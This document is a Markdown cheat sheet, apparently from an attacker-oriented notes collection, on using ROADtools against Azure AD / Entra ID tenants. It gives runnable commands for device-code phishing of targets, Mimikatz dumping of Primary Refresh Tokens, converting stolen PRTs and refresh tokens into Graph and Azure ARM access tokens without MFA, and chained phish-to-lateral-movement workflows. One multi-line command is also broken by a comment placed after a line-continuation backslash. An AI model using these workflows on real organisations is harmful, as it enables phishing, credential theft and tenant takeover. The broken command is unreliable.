# ROADtools

**Tags:** `#roadtools` `#roadrecon` `#roadtx` `#azuread` `#entraid` `#cloud` `#enumeration` `#prt` `#oauth` `#microsoft365`

Python toolkit for Azure AD / Entra ID enumeration and token abuse. Two main components: **roadrecon** (bulk tenant data collection into a SQLite DB with a web UI) and **roadtx** (token manipulation — device code phishing, PRT abuse, OAuth flows). Written by Dirk-jan Mollema — the same author as most of the foundational Azure AD research.

**Source:** https://github.com/dirkjanm/ROADtools
**Install:**
```bash
pip install roadrecon    # roadrecon component
pip install roadtx       # roadtx component
# Or both: pip install roadtools
```

> [!note] **ROADtools vs AADInternals** — ROADtools is Python (runs natively on Kali), AADInternals is PowerShell (needs Windows or pwsh). Use ROADtools from your attack box for recon and token work; use AADInternals when you're already on a Windows host or need PTA/Connect-specific attacks.

---

## roadrecon — Tenant Enumeration

roadrecon collects all available Azure AD objects into a local SQLite database, then lets you query or browse them offline.

### Authentication

```bash
# Interactive browser login
roadrecon auth

# Device code (useful when browser not available)
roadrecon auth --device-code

# Username + password (managed tenants only — no MFA)
roadrecon auth -u user@company.com -p 'Password123!'

# Specify tenant ID
roadrecon auth -t <tenant-id>

# Using a refresh token
roadrecon auth --refresh-token <token>

# Using a PRT cookie (stolen from AADJ device)
roadrecon auth --prt-cookie <cookie> --prt-sessionkey <hex-key>
```

### Data Collection

```bash
# Gather everything — users, groups, roles, devices, apps, service principals, policies
roadrecon gather

# Gather only specific objects
roadrecon gather --users
roadrecon gather --groups
roadrecon gather --devices
roadrecon gather --applications
roadrecon gather --servicePrincipals
roadrecon gather --policies

# Use a specific token file
roadrecon gather --tokens .roadtools_auth

# Output to custom DB file
roadrecon gather -d /tmp/tenant.db
```

### Browse & Query

```bash
# Launch web UI (browse at http://127.0.0.1:5000)
roadrecon gui
roadrecon gui -d /tmp/tenant.db    # specify DB file

# CLI dump to JSON
roadrecon dump --users
roadrecon dump --groups
roadrecon dump --servicePrincipals
roadrecon dump --applications
roadrecon dump --conditionalAccessPolicies

# Plugin: generate BloodHound-compatible output
roadrecon plugin bloodhound
# Import output into BloodHound for attack path analysis
```

**What to look for in the web UI:**

| Object | What to Check |
|---|---|
| Users | MFA status, on-prem sync, admin roles assigned |
| Groups | Dynamic vs assigned, privileged group members |
| Roles | Who has Global Admin, Privileged Role Admin, Application Admin |
| Applications | App registrations with long-lived secrets or over-permissive Graph API scopes |
| Service Principals | High-privilege SP creds, managed identity assignments |
| Devices | Azure AD joined vs registered, compliant status |
| CA Policies | Gaps — what's excluded, which users/apps/locations are not covered |

---

## roadtx — Token Manipulation

roadtx handles OAuth flows, PRT abuse, device code phishing, and token refresh/conversion.

### Get Tokens

```bash
# Interactive browser
roadtx gettokens --tenant <tenant-id>

# Device code phishing — outputs a code for the target to enter
roadtx gettokens --device-code --tenant <tenant-id>
# Give target: "Go to microsoft.com/devicelogin and enter: ABCD-EFGH"
# roadtx polls and saves token when they authenticate

# Username + password (no MFA — managed tenants)
roadtx gettokens -u user@company.com -p 'Password123!'

# Request token for specific resource/scope
roadtx gettokens --scope https://graph.microsoft.com/.default
roadtx gettokens --scope https://outlook.office.com/.default    # Exchange
roadtx gettokens --scope https://management.azure.com/.default  # Azure ARM

# Refresh an existing token
roadtx gettokens --refresh-token <token> --scope <scope>
```

### PRT Abuse

PRTs are long-lived tokens on Azure AD-joined devices. Steal with Mimikatz (`sekurlsa::cloudap`), then use roadtx to convert to access tokens — no MFA required.

```bash
# Convert stolen PRT to access token
roadtx gettokens \
  --prt <base64-prt> \
  --prt-sessionkey <hex-session-key> \
  --tenant <tenant-id>

# Get tokens for a specific resource using PRT
roadtx gettokens \
  --prt <base64-prt> \
  --prt-sessionkey <hex-session-key> \
  --scope https://graph.microsoft.com/.default

# Generate a PRT cookie for browser use
roadtx prtauth \
  --prt <base64-prt> \
  --prt-sessionkey <hex-session-key>
# Sets x-ms-RefreshTokenCredential cookie — use in browser to get session

# Get PRT from LSASS via roadtx (requires access to Windows DPAPI keys)
roadtx decrypt-prt --prt-blob <blob> --dpapi-key <key>
```

### Refresh Token Abuse

```bash
# Use a stolen refresh token to get a new access token
roadtx gettokens --refresh-token <rt> --scope https://graph.microsoft.com/.default

# Enumerate what scopes a refresh token is valid for
roadtx gettokens --refresh-token <rt> --scope https://management.azure.com/.default
roadtx gettokens --refresh-token <rt> --scope https://outlook.office.com/.default

# FOCI (Family of Client IDs) — some refresh tokens work across multiple apps
# Try different client IDs with the same refresh token
roadtx gettokens --refresh-token <rt> \
  --client 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \   # Azure CLI
  --scope https://graph.microsoft.com/.default
```

### Inspect Tokens

```bash
# Decode and display a JWT token
roadtx describe --token <access-token>
# Shows: UPN, tenant, roles, scopes, expiry, audience, client app

# Or decode manually
echo "<token>" | python3 -c "
import sys, base64, json
t = sys.stdin.read().strip().split('.')
p = t[1] + '=' * (4 - len(t[1]) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
```

---

## Common Attack Workflows

### External Recon → Device Code Phish → Full Enum

```bash
# 1. Recon tenant without auth
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq '.issuer'
curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain>&api-version=1.0" | jq '{type:.NameSpaceType}'

# 2. Start device code phish
roadtx gettokens --device-code --scope https://graph.microsoft.com/.default
# Send the user_code to target via phishing

# 3. When token received, gather all tenant data
roadrecon gather

# 4. Browse data
roadrecon gui
```

### PRT Theft → Token → Lateral Movement

```bash
# On compromised AADJ Windows box — dump PRT with Mimikatz
# privilege::debug
# sekurlsa::cloudap

# Convert PRT to Graph token (Kali)
roadtx gettokens --prt <prt> --prt-sessionkey <key> \
  --scope https://graph.microsoft.com/.default

# Use token to enumerate
roadrecon gather --tokens .roadtools_auth

# Convert PRT to Azure ARM token (pivot to Azure resources)
roadtx gettokens --prt <prt> --prt-sessionkey <key> \
  --scope https://management.azure.com/.default
```

---

## Key Files

| File | Contents |
|---|---|
| `.roadtools_auth` | Saved tokens (JSON) — default output of `roadrecon auth` |
| `roadrecon.db` | SQLite database from `roadrecon gather` |
| `bh-output/` | BloodHound JSON files from `roadrecon plugin bloodhound` |

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
